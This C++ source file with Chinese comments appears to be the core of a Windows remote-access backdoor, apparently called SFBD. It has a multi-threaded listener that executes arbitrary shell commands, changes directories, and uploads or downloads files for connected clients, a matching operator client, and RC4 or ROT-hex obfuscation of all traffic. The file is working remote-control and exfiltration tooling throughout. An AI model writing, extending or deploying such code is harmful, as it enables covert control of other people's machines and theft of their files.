#include "public.h"
#include "controller.hpp"
#include "arc4.hpp"



//创建一个线程函数
DWORD WINAPI lthread(LPVOID sock) {
	//转换类型
	SOCKET* sockClient = (SOCKET*)sock;
	//初始化用于控制的类
	Controller cont;
	//循环获取执行命令
	while (true) {
		//接受客户端指令,每次循环要初始化不然会相互影响
		char recvBuf[10240];
		memset(recvBuf, 0, 10240);

		//在接收数据前先发送当前路径
		char CurPath[255];
		GetCurrentDirectoryA(sizeof(CurPath),CurPath);
		//发送得太快客户端来不及收
		Sleep(100);
		send_message(sockClient, CurPath);

		//等待接收输入
		string cmd = recv_message(sockClient, recvBuf,10240);

		//内置命令流程
		string output = cont.DIYcmd(cmd);
		//输出太多的时候要与之后发送的消息分割防止流程混乱
		if (output.length() > 5000) {
			send_message(sockClient, output);
			Sleep(500);
			continue;
		}
		else if (output.length() > 0) {
			send_message(sockClient, output);
			continue;
		}

		//退出流程判断，仅退出当前线程socket
		if ((!cmd.compare("quit")) || (!cmd.compare("exit"))) {

			closesocket(*sockClient);
			return 0;
		}
		//路径穿越（多客户端只能共享一个实际路径）
		else if ((!cmd.substr(0,2).compare("cd"))) {
			SetCurrentDirectoryA(cont.text_substr(cmd).data());
			send_message(sockClient, cont.text_substr(cmd).data());
			continue;
		}
		//文件传输
		else if (!cmd.substr(0,8).compare("download")) {
			if (cont.FILEorDIR(cont.text_substr(cmd, " ", 2)).compare("error")) {
				send_message(sockClient, "开始传输...");
				cont.upload_file(cmd, sockClient);
			}
			else send_message(sockClient, cont.upload_file(cmd, sockClient));
			continue;
		}
		else if (!cmd.substr(0,6).compare("upload")) {
			send_message(sockClient, "开始传输...");
			cont.download_file(cmd,sockClient);
			continue;
		}
		//关闭所有socket资源
		else if (!cmd.compare("close")) {
			closesocket(*sockClient);
			WSACleanup();
			return 0;
		}
		else if (!cmd.compare("\n")) {
			continue;
		}

		//调用执行命令函数并发送执行结果
		string cmd_output = cont.command((char*)cmd.data());
		send_message(sockClient, cmd_output);
	}
}


void server(Config& c)
{
	WSADATA wsaData;
	SOCKET sockServer;
	SOCKADDR_IN addrServer;
	SOCKADDR_IN addrClient;
	int len = sizeof(SOCKADDR);
	//初始化用于控制的类
	Controller cont;

	//初始化socket，指定套接字库版本
	WSAStartup(0x0202, &wsaData);
	sockServer = socket(AF_INET, SOCK_STREAM, 0);
	addrServer.sin_addr.S_un.S_addr = htonl(INADDR_ANY);
	addrServer.sin_family = AF_INET;

	//指定监听端口
	addrServer.sin_port = htons(c.listen_port);
	bind(sockServer, (SOCKADDR*)&addrServer, len);

	//指定监听会话上限
	listen(sockServer, c.max_conn);

	//创建指定数量的socket多线程监听
	for (int i = 0; i <= c.max_conn; i++) {
		SOCKET* sockClient = new SOCKET;
		*sockClient = accept(sockServer, (SOCKADDR*)&addrClient, &len);
		CreateThread(NULL, 0, &lthread, sockClient, 0, NULL);
	}
}



void client(Config& c)
{
	WSADATA wsaData;
	SOCKET sockClient;
	SOCKADDR_IN addrServer;
	string output;
	//初始化用于控制的类
	Controller cont;

	//初始化socket，指定套接字库版本
	WSAStartup(0x0202, &wsaData);
	//创建客户端套接字    
	sockClient = socket(AF_INET, SOCK_STREAM, 0);
	//创建服务端套接字
	inet_pton(AF_INET, c.target, (PVOID)&addrServer.sin_addr.S_un.S_addr);
	//使用TCP/IP地址格式
	addrServer.sin_family = AF_INET;
	//指定端口
	addrServer.sin_port = htons(c.conn_port);
	//连接到服务端
	connect(sockClient, (SOCKADDR*)&addrServer, sizeof(SOCKADDR));

	cout << "\n输入SFBD::help获取帮助\n\n";
	//接收和发送数据
	while (true) {
		//初始化缓冲区
		char message[10240];
		char* text_buf = new char[c.bufsize];
		memset(text_buf, 0, c.bufsize);

		//先接收当前路径显示
		output = recv_message(&sockClient, text_buf, c.bufsize);
		cout << output + "> ";

		//接收命令
		cin.getline(message, 10240 - 1);
		//命令预处理
		if (!strcmp(message, "")) strcpy_s(message, "\n");
		else if (!memcmp(message, "upload", 6)) {
			if (!cont.FILEorDIR(cont.text_substr(message," ",2)).compare("error")) {
				cout << cont.upload_file(message, &sockClient) << endl;
				strcpy_s(message, "\n");
			}
		}

		//判断连接状态
		int sock_status = send_message(&sockClient, message);
		if ((sock_status == -1) | (!strcmp(message, "close"))) {
			cout << "\n已断开连接...\n";
			//关闭/清除套接字，释放资源  
			closesocket(sockClient);
			WSACleanup();
			break;
		}

		//清空缓冲区
		memset(text_buf, 0, c.bufsize);
		//发送命令并接收命令输出
		if (strcmp(message, "\n")) {
			output = recv_message(&sockClient, text_buf, c.bufsize);
			cout << output << endl;
		}
		//如果需要则记录命令及输出
		if (Config::enable_log) {
			fstream file(Config::logfile, ios::app);
			if (file) file << "Command: " << message << endl << output << endl;
			file.close();
		}

		//自定义命令
		if (!memcmp(message, "download", 8)) {
			if (!output.compare("开始传输...")){
				string output = cont.download_file(message, &sockClient, 1);
				cout << output << endl;
			}
			continue;
		}
		else if (!memcmp(message, "upload", 6)) {
			string output = cont.upload_file(message, &sockClient, 1);
			cout << output << endl;
			continue;
		}

		delete[] text_buf;
	}
}

int send_rc4text(SOCKET* sock, string text) {
	ARC4 c(Config::key.data());

	int s_len = text.length();
	uint8_t* result = new uint8_t[s_len + 1];
	c.encrypt(result, (const uint8_t*)text.data(), s_len);

	string num1 = to_string(s_len);
	send(*sock, num1.data(), num1.length(), 0);
	int sock_status = send(*sock, (char*)result, s_len, 0);


	return sock_status;
}


char* recv_rc4text(SOCKET* sock, char* text_buf) {

	ARC4 d(Config::key.data());
	char len_buf[100];
	memset(len_buf, 0, 100);
	recv(*sock, len_buf, 100, 0);

	int buflen = atoi(len_buf);
	recv(*sock, text_buf, buflen, 0);

	char* text = new char[buflen + 1];
	memset(text, 0, buflen + 1);
	d.encrypt((uint8_t*)text, (const uint8_t*)text_buf, buflen);

	return text;
}


int send_rottext(SOCKET* sock, string message) {

	Controller cont;
	message = cont.toHex(message);
	message = cont.Rot18(message, "encry");
	int sock_status = send(*sock, message.data(), message.length(), 0);
	return sock_status;
}


string recv_rottext(SOCKET* sock, char* text_buf, int size) {

	Controller cont;
	recv(*sock, text_buf, size, 0);
	string message = cont.Rot18(text_buf, "decry");
	message = cont.HextoStr(message);
	return message;
}

string recv_message(SOCKET* sock, char* text_buf, int size) {
	string result;
	if (!Config::encry_mode.compare("rc4")) {
		char* text = recv_rc4text(sock, text_buf);
		result = text;
		delete[] text;
	}
	else if (!Config::encry_mode.compare("rot")) {
		result = recv_rottext(sock, text_buf, size);
	}
	return result;
}

int send_message(SOCKET* sock, string message) {
	int status = 0;
	if (!Config::encry_mode.compare("rc4")) {
		status = send_rc4text(sock, message);
	}
	else if (!Config::encry_mode.compare("rot")) {
		status = send_rottext(sock, message);
	}
	return status;
}
